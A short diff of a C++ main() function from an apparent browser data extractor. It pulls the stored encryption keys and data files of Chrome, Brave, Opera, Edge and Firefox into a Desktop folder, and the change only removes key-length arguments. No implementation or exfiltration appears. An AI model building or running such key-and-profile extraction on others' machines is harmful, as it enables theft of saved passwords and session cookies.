@@ -16,21 +16,21 @@ int main()
 
 	const std::string destinationPath{ "C:/Users/" + username + "/Desktop/BrowserData" };
 
-	chrome.ExtractKey(chromePath, Browser::CHROME_BASE64_KEY_LENGTH);
+	chrome.ExtractKey(chromePath);
 	chrome.WriteExtractedKeyToFile(destinationPath);
 	chrome.ExtractFiles(chromePath, destinationPath);
 
-	brave.ExtractKey(bravePath, Browser::BRAVE_BASE64_KEY_LENGTH);
+	brave.ExtractKey(bravePath);
 	brave.WriteExtractedKeyToFile(destinationPath);
 	brave.ExtractFiles(bravePath, destinationPath);
 
-	opera.ExtractKey(operaPath, Browser::OPERA_BASE64_KEY_LENGTH);
+	opera.ExtractKey(operaPath);
 	opera.ExtractFiles(operaPath, destinationPath);
 	opera.WriteExtractedKeyToFile(destinationPath);
 
 	firefox.ExtractFiles(firefoxPath, destinationPath);
 
-	edge.ExtractKey(edgePath, Browser::EDGE_BASE64_KEY_LENGTH);
+	edge.ExtractKey(edgePath);
 	edge.ExtractFiles(edgePath, destinationPath);
 	edge.WriteExtractedKeyToFile(destinationPath);
 
